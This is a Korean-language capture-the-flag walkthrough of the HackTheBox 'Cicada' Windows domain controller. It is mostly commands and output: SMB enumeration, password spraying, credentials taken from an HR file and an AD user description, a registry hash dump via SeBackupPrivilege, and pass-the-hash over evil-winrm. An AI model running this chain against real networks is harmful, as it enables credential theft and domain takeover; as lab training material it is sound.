---
tags:
  - type/machine
  - platform/htb
  - os/windows
  - status/solved
  - tech/ad/dnsadmins
  - tech/win/sebackup
  - tech/win/serestore
  - tech/web/lfi-rfi
  - tech/svc/smb
  - tech/exec/winrm
  - tech/cred/spray
type: machine
platform: htb
os: windows
ip: 10.129.8.121
domain: cicada.htb
ports: [53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985]
services: [domain, http, kerberos-sec, kpasswd5, ldap, microsoft-ds, msrpc, ncacn_http, netbios-ssn, ssl/ldap]
status: solved
tech_count: 7
---
## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ nmap -sCV -p- -Pn -A --min-rate 5000 10.129.8.121 -oN nmap.log
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-14 20:24 +0900
Nmap scan report for 10.129.8.121
Host is up (0.22s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-14 11:33:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-14T11:34:51+00:00; +8m22s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-03-14T11:34:50+00:00; +8m21s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-03-14T11:34:51+00:00; +8m22s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-03-14T11:34:50+00:00; +8m21s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
58178/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-14T11:34:08
|_  start_date: N/A
|_clock-skew: mean: 8m20s, deviation: 2s, median: 8m20s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   221.43 ms 10.10.14.1
2   221.75 ms 10.129.8.121

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.56 seconds
                                                                  
```

hosts 정보 수집
```bash
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ nxc smb 10.129.8.121 --generate-hosts-file hosts
SMB         10.129.8.121    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)

```

hosts 파일 설정

```bash
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ cat hosts            
10.129.8.121     CICADA-DC.cicada.htb cicada.htb CICADA-DC
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ cat hosts | sudo tee -a /etc/hosts
10.129.8.121     CICADA-DC.cicada.htb cicada.htb CICADA-DC
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ cat /etc/hosts                    
10.129.8.121     CICADA-DC.cicada.htb cicada.htb CICADA-DC

```

NULL 세션으로 smb공유 폴더 접근 실패, guest 계정으로 인증 성공
```bash
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ nxc smb 10.129.8.121 --shares
SMB         10.129.8.121    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.121    445    CICADA-DC        [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

```

```bash
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ nxc smb 10.129.8.121 -u 'guest' -p '' --shares
SMB         10.129.8.121    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.121    445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.8.121    445    CICADA-DC        [*] Enumerated shares
SMB         10.129.8.121    445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.8.121    445    CICADA-DC        -----           -----------     ------
SMB         10.129.8.121    445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.8.121    445    CICADA-DC        C$                              Default share
SMB         10.129.8.121    445    CICADA-DC        DEV                             
SMB         10.129.8.121    445    CICADA-DC        HR              READ            
SMB         10.129.8.121    445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.8.121    445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.129.8.121    445    CICADA-DC        SYSVOL                          Logon server share 

```


SMB HR 디렉토리에 접근하여 “Notice from HR.txt” 파일 다운로드
```bash
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ smbclient //10.129.8.121/HR -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 21:29:09 2024
  ..                                  D        0  Thu Mar 14 21:21:29 2024
  Notice from HR.txt                  A     1266  Thu Aug 29 02:31:48 2024

                4168447 blocks of size 4096. 477828 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
```

해당 파일에서 디폴트 비밀번호 획득`Cicada$M6Corpb*@Lp#nZp!8`
```bash
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ cat Notice\ from\ HR.txt      

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp

```

사용자 목록 추출
```bash
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ impacket-lookupsid cicada.htb/guest@10.129.8.121 -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.8.121
[*] StringBinding ncacn_np:10.129.8.121[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)

```

Password Spraying 실행하여 자격증명 획득`michael.wrightson/Cicada$M6Corpb*@Lp#nZp!8

```bash
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ nxc smb 10.129.8.121 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success -t 100
SMB         10.129.8.121    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.121    445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.8.121    445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.8.121    445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.8.121    445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.8.121    445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.8.121    445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.8.121    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.8.121    445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.8.121    445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.8.121    445    CICADA-DC        [+] cicada.htb\:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
```

Active Directory 유저 열거 결과 description에서 david.orelious 비밀번호 획득
`david.orelious/aRt$Lp#7t*VQ!3`

```bash
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ nxc smb 10.129.8.121 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.129.8.121    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.121    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.8.121    445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                                                                                             
SMB         10.129.8.121    445    CICADA-DC        Administrator                 2024-08-26 20:08:03 1       Built-in account for administering the computer/domain                                                                    
SMB         10.129.8.121    445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain                                                                  
SMB         10.129.8.121    445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 1       Key Distribution Center Service Account                                                                                   
SMB         10.129.8.121    445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1        
SMB         10.129.8.121    445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1        
SMB         10.129.8.121    445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.129.8.121    445    CICADA-DC        david.orelious                2024-03-14 12:17:29 1       Just in case I forget my password is aRt$Lp#7t*VQ!3                                                                       
SMB         10.129.8.121    445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 1        
SMB         10.129.8.121    445    CICADA-DC        [*] Enumerated 8 local users: CICADA

```

emily.oscars 계정으로 SMB와 WinRM 인증 성공
```bash
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ nxc smb 10.129.8.121 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
SMB         10.129.8.121    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.121    445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt 

┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ nxc winrm 10.129.8.121 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
WINRM       10.129.8.121    5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.129.8.121    5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)

```

 WinRM 접속
 ```bash
 ┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ evil-winrm -i 10.129.8.121 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> 

 ```

user.txt 획득
![[Pasted image 20260314135621.png]]

## Privilege Escalation

emily.oscars 계정 권한 확인
`SeBackupPrivilege, SeRestorePrivilege`
```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

emily.oscars가 보유한 SeBackupPrivilege 권한을 이용하여 administrator의 NTLM 해시 덤프

```bash
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ nxc smb 10.129.8.121 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' -M backup_operator
SMB         10.129.8.121    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.121    445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt 
BACKUP_O... 10.129.8.121    445    CICADA-DC        [*] Triggering RemoteRegistry to start through named pipe...
BACKUP_O... 10.129.8.121    445    CICADA-DC        Saved HKLM\SAM to \\10.129.8.121\SYSVOL\SAM
BACKUP_O... 10.129.8.121    445    CICADA-DC        Saved HKLM\SYSTEM to \\10.129.8.121\SYSVOL\SYSTEM
BACKUP_O... 10.129.8.121    445    CICADA-DC        Saved HKLM\SECURITY to \\10.129.8.121\SYSVOL\SECURITY
SMB         10.129.8.121    445    CICADA-DC        [*] Copying "SAM" to "/home/kali/.nxc/logs/CICADA-DC_10.129.8.121_2026-03-14_204816.SAM"
SMB         10.129.8.121    445    CICADA-DC        [+] File "SAM" was downloaded to "/home/kali/.nxc/logs/CICADA-DC_10.129.8.121_2026-03-14_204816.SAM"
SMB         10.129.8.121    445    CICADA-DC        [*] Copying "SECURITY" to "/home/kali/.nxc/logs/CICADA-DC_10.129.8.121_2026-03-14_204816.SECURITY"
SMB         10.129.8.121    445    CICADA-DC        [+] File "SECURITY" was downloaded to "/home/kali/.nxc/logs/CICADA-DC_10.129.8.121_2026-03-14_204816.SECURITY"
SMB         10.129.8.121    445    CICADA-DC        [*] Copying "SYSTEM" to "/home/kali/.nxc/logs/CICADA-DC_10.129.8.121_2026-03-14_204816.SYSTEM"
SMB         10.129.8.121    445    CICADA-DC        [+] File "SYSTEM" was downloaded to "/home/kali/.nxc/logs/CICADA-DC_10.129.8.121_2026-03-14_204816.SYSTEM"
BACKUP_O... 10.129.8.121    445    CICADA-DC        Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::                                                                                            
BACKUP_O... 10.129.8.121    445    CICADA-DC        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                    
BACKUP_O... 10.129.8.121    445    CICADA-DC        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                           
BACKUP_O... 10.129.8.121    445    CICADA-DC        $MACHINE.ACC:plain_password_hex:6209748a5ab74c44bd98fc5015b6646467841a634c4a1b2d6733289c33f76fc6427f7ccd8f6d978a79eec3ae49eb8c0b5b14e193ec484ea1152e8a04e01a3403b3111c0373d126a566660a7dd083aec1921d53a82bc5129408627ae5be5e945ed58cfb77a2a50e9ffe7e6a4531febd965181e528815d264885921118fb7a74eff51306dbffa4d6a0c995be5c35063576fc4a3eba39d0168d4601da0a0c12748ae870ff36d7fb044649032f550f04c017f6d94675b3517d06450561c71ddf8734100898bf2c19359c69d1070977f070e3b8180210a92488534726005588c0f269a7e182c3c04b96f7b5bc4af488e128f8           
BACKUP_O... 10.129.8.121    445    CICADA-DC        $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696                                                                                                   
BACKUP_O... 10.129.8.121    445    CICADA-DC        dpapi_machinekey:0x0e3d4a419282c47327eb03989632b3bef8998f71
dpapi_userkey:0x4bb80d985193ae360a4d97f3ca06350b02549fbb
BACKUP_O... 10.129.8.121    445    CICADA-DC        NL$KM:cc1501f764391e7a5e538cc174e62b01369b50b8d07223d9b6c56e922f5708d81eba8e8123250327364c19b496cd251f8ff97f5d71e66e8cffcbeb5e4ea4e696                                            
SMB         10.129.8.121    445    CICADA-DC        [+] cicada.htb\Administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)                                                                                                            
BACKUP_O... 10.129.8.121    445    CICADA-DC        [*] Dumping NTDS...
SMB         10.129.8.121    445    CICADA-DC        [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.8.121    445    CICADA-DC        [-] Could not connect: timed out
BACKUP_O... 10.129.8.121    445    CICADA-DC        [*] Cleaning dump with user Administrator and hash 2b87e7c93a3e8a0ea4a581937016f341 on domain cicada.htb
BACKUP_O... 10.129.8.121    445    CICADA-DC        [*] Successfully deleted dump files !

```

획득한 administrator의 NTLM 해시를 사용해서 WinRM 접속
```bash
┌──(kali㉿kali)-[~/HTB/Cicada]
└─$ evil-winrm -i 10.129.8.121 -u 'administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                      
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

root.txt 획득
![[Pasted image 20260314140348.png]]
